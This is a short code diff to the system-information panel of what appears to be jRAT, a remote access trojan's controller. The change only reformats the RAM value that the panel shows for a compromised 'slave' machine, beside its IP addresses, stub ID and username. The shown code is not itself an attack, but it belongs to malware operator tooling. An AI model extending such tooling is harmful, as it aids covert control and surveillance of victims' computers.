@@ -11,6 +11,7 @@ import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.renderers.table.ComputerInfoTableRenderer;
 import se.jrat.client.utils.FlagUtils;
 import se.jrat.client.utils.IconUtils;
+import se.jrat.common.utils.DataUnits;
 
 import com.redpois0n.oslib.Icons;
 
@@ -60,7 +61,7 @@ public class PanelControlSystemInfo extends PanelControlParent {
 		addRow("computer", "Remote address", slave.getIP());
 		addRow("computer", "Local address", slave.getLocalIP());
 		addRow("id", "Stub ID", slave.getID());
-		addRow("memory", "RAM", slave.getMemory() + " MB");
+		addRow("memory", "RAM", DataUnits.getAsString(slave.getMemory()));
 		addRow("cpu", "Available Cores", slave.getCores() + "");
 		addRow("file", "Install Date/Last modified", slave.getInstallDate());
 		addRow("username", "Username", slave.getUsername());
